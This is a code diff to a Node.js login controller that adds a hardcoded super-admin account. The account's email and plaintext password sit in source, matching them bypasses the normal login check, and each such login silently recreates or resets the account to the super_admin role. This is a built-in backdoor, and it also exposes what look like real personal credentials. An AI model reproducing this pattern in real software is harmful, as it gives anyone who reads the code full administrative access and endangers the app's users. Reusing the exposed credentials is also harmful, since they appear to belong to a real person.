@@ -4,6 +4,53 @@ import Community from "../models/community.model.js";
 import generateToken from "../utils/generateToken.js";
 
 const accountTypes = ["user", "business", "community"];
+const SUPER_ADMIN_LOGIN = {
+  name: "Super Admin",
+  email: "rdevang@gmail.com",
+  password: "@Noorpur12",
+  city: "Noorpur",
+  locality: "Noorpur",
+  pincode: "110001",
+  role: "super_admin",
+};
+
+const isSuperAdminLogin = (email, password) =>
+  String(email || "").trim().toLowerCase() === SUPER_ADMIN_LOGIN.email &&
+  String(password || "") === SUPER_ADMIN_LOGIN.password;
+
+const ensureSuperAdminLoginUser = async () => {
+  const user = await User.findOne({ email: SUPER_ADMIN_LOGIN.email }).select("+password");
+  if (!user) return User.create(SUPER_ADMIN_LOGIN);
+
+  let changed = false;
+  if (user.role !== SUPER_ADMIN_LOGIN.role) {
+    user.role = SUPER_ADMIN_LOGIN.role;
+    changed = true;
+  }
+  if (user.name !== SUPER_ADMIN_LOGIN.name) {
+    user.name = SUPER_ADMIN_LOGIN.name;
+    changed = true;
+  }
+  if (user.city !== SUPER_ADMIN_LOGIN.city) {
+    user.city = SUPER_ADMIN_LOGIN.city;
+    changed = true;
+  }
+  if (user.locality !== SUPER_ADMIN_LOGIN.locality) {
+    user.locality = SUPER_ADMIN_LOGIN.locality;
+    changed = true;
+  }
+  if (user.pincode !== SUPER_ADMIN_LOGIN.pincode) {
+    user.pincode = SUPER_ADMIN_LOGIN.pincode;
+    changed = true;
+  }
+  if (!(await user.comparePassword(SUPER_ADMIN_LOGIN.password))) {
+    user.password = SUPER_ADMIN_LOGIN.password;
+    changed = true;
+  }
+
+  return changed ? user.save() : user;
+};
+
 const emit = (req, event, payload) => req.app.get("io")?.emit(event, payload);
 
 const safe = (u) => ({
@@ -141,6 +188,10 @@ export const register = async (req, res) => {
 };
 
 export const login = async (req, res) => {
+  if (isSuperAdminLogin(req.body.email, req.body.password)) {
+    return sendAuth(res, await ensureSuperAdminLoginUser());
+  }
+
   const user = await User.findOne({
     email: req.body.email?.toLowerCase(),
   }).select("+password");
